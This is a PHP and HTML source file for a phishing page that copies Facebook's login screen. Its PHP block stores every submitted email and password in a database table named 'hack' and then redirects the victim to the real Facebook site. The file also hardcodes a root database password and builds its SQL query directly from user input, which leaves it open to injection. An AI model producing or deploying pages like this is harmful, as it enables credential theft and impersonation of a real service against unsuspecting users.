<?php
 $servername = "localhost:3307";
 $username = "root";
 $password = "kr256ishan";
 $database = "facebook";
 $conn = mysqli_connect($servername,$username,$password,$database);
 if(!$conn){
     mysqli_connect_error();
     die();
 }


if(isset($_POST['submit'])){
   $username = $_POST['username'];
   $password = $_POST['password'];
//    echo $username;
//    echo $password;
  
    $query = "insert into hack set username = '$username', pass = '$password'";
    $execuate = mysqli_query($conn,$query);
    if(!$execuate){
        echo mysqli_error($conn);
    }

    header("location:https://www.facebook.com/");
}

?>






<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/bootstrap.min.css">
  
    <title>Facebook -log in or sign up</title>
    
    <link rel="shorcut icon" href="images/fb_icon_325x325.png">
    <link rel="stylesheet" href="facebook.css">
</head>
<body>
    <div class="wrapper">
        <div class="wrap pt-md-5 px-md-5">
            <div class="container px-md-5">
                <div class="row top pt-md-5 px-md-5">
                    <div class="col-md-6 ps-5 first">
                        <div class="image">

                            <img src="images/FBWordmark_Hex-RGB-1024.svg" class="" alt="facebook">
                        </div>
                        <h2>Facebook helps you connect and share<br> with the people in your life.</h2>
                    </div>
                    <div class="col-md-6 pe-5 second">
                        <form action="" method="post" class="form bg-white">
                            <div class="form-group">
                                <input type="email" name="username" class="form-control-lg" value="" placeholder="Email address or phone number">
                            </div>
                            <div class="form-group mt-3">
                                <input type="password" name="password" class="form-control-lg" value="" placeholder="Password">
                            </div>
                            <div class="form-group mt-3">
                                <input type="submit" name="submit" style="padding:8px 0 !important;" class="btn btn-primary w-100 fw-bold fs-5" value="Log In">
                            </div>
                            <a href="" class="pt-3 pb-2 text-decoration-none">Forgotten password?</a>
                            <div class="form-group">
                                <hr class="w-100">
                            </div>
                            <div class="form-group pt-2 pb-3 d-flex justify-content-center">
                                <button class="btn create fw-bold ">Create New Account</button>
                            </div>
                        </form>

                        <p class="py-4" style="margin-left:30px; font-size:14px;"><b>Create a Page</b> for a celebrity, brand or business.</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer py-3">
            <div class="container px-md-5">
                <div class="row px-md-5">
                    <div class="col-md-12 font ps-md-5">
                        <p class="d-inline-block me-2">English (UK)</p>
                        <a href="" class="color">हिन्दी</a>
                        <a href="" class="color">ਪੰਜਾਬੀ</a>
                        <a href="" class="color">اردو</a>
                        <a href="" class="color">ગુજરાતી</a>
                        <a href="" class="color">मराठी</a>
                        <a href="" class="color">বাংলা</a>
                        <a href="" class="color">தமிழ்</a>
                        <a href="" class="color">తెలుగు</a>
                        <a href="" class="color">മലയാളം</a>
                        <a href="" class="color">ಕನ್ನಡ</a>
                        <button class="">+</button>
                        <hr class="mb-3 mt-0 ms-0 me-0">
                        
                        <a href="" class="colors">Sign Up</a>
                        <a href="" class="colors">Log In</a>
                        <a href="" class="colors">Messenger</a>
                        <a href="" class="colors">Facebook Lite</a>
                        <a href="" class="colors">Watch</a>
                        <a href="" class="colors">Places</a>
                        <a href="" class="colors">Games</a>
                        <a href="" class="colors">Marketplace</a>
                        <a href="" class="colors">Facebook Pay</a>
                        <a href="" class="colors">Oculus</a>
                        <a href="" class="colors">Portal</a>
                        <a href="" class="colors">Instagram</a>
                        <a href="" class="colors">Bulletin</a>
                        <a href="" class="colors">Local</a>
                        <br>
                        <a href="" class="colors">Fundraisers</a>
                        <a href="" class="colors">Services</a>
                        <a href="" class="colors">Voting Information Centre</a>
                        <a href="" class="colors">Groups</a>
                        <a href="" class="colors">About</a>
                        <a href="" class="colors">Create ad</a>
                        <a href="" class="colors">Create Page</a>
                        <a href="" class="colors">Developers</a>
                        <a href="" class="colors">Careers</a>
                        <a href="" class="colors">Privacy</a>
                        <a href="" class="colors">Cookies</a>
                        <a href="" class="colors">AdChoices</a>
                        <br>
                        <a href="" class="colors">Terms</a>
                        <a href="" class="colors">Help</a>
                        <a href="" class="colors">Contact uploading and non-users Settings</a>

                        <p class="mt-4 font color">Meta © 2022</p>

                    </div>
                    

                   
                </div>
            </div>
        </div>
    </div>
</body>
</html>